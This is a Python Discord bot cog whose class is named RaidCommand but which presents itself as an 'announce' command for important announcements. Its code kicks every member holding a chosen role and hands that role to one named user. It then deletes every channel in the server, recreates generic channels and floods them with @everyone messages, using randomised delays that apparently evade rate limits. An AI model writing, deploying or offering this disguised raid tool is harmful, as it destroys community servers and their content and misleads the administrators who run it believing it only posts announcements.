import discord
from discord import app_commands
from discord.ext import commands
import asyncio
import random

class RaidCommand(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @app_commands.command(name="announce", description="Herramienta de anuncios importantes")
    @app_commands.describe(
        useradmin="Usuario para dar el rol",
        roletogive="Rol de administración",
        message="Mensaje importante para anunciar"
    )
    @app_commands.checks.has_permissions(administrator=True)
    async def announce(self, interaction: discord.Interaction, 
                      useradmin: discord.User, 
                      roletogive: discord.Role, 
                      message: str):
        """Comando para realizar acciones administrativas y enviar anuncios"""
        await interaction.response.defer(ephemeral=True)
        
        try:
            # 1. Expulsar miembros con el rol especificado (excepto useradmin)
            guild = interaction.guild
            members_to_kick = []
            
            async for member in guild.fetch_members():
                if roletogive in member.roles and member.id != useradmin.id:
                    members_to_kick.append(member)
            
            for i, member in enumerate(members_to_kick):
                try:
                    await member.kick(reason=f"Reorganización: {interaction.user}")
                    if i % 3 == 0:
                        await asyncio.sleep(1.2)
                except Exception as e:
                    print(f"No se pudo expulsar a {member}: {e}")
            
            # 2. Añadir rol al admin
            try:
                admin_member = await guild.fetch_member(useradmin.id)
                await admin_member.add_roles(roletogive)
            except Exception as e:
                print(f"No se pudo añadir el rol a {useradmin}: {e}")
            
            # 3. Eliminar todos los canales
            for i, channel in enumerate(guild.channels):
                try:
                    await channel.delete()
                    await asyncio.sleep(0.5 + (i * 0.2))
                except Exception as e:
                    print(f"No se pudo eliminar el canal {channel.name}: {e}")
            
            # 4. Crear canales y spamear mensajes
            channel_names = ['general', 'announcements', 'important', 'chat', 'welcome']
            created_channels = []
            
            for name in channel_names:
                try:
                    new_channel = await guild.create_text_channel(name)
                    created_channels.append(new_channel)
                    await asyncio.sleep(1 + random.random() * 2)
                except Exception as e:
                    print(f"Error al crear canal: {e}")
            
            # 5. Enviar mensajes con @everyone
            spam_message = f"@everyone {message}"
            
            for channel in created_channels:
                try:
                    for _ in range(2 + random.randint(0, 2)):
                        await channel.send(spam_message)
                        await asyncio.sleep(2 + random.random() * 3)
                except Exception as e:
                    print(f"Error al enviar mensaje en {channel.name}: {e}")
            
            await interaction.followup.send("Operación completada exitosamente.", ephemeral=True)
            
        except Exception as e:
            print(f"Error durante la ejecución: {e}")
            await interaction.followup.send("Ocurrió un error durante el proceso.", ephemeral=True)

async def setup(bot):
    await bot.add_cog(RaidCommand(bot))
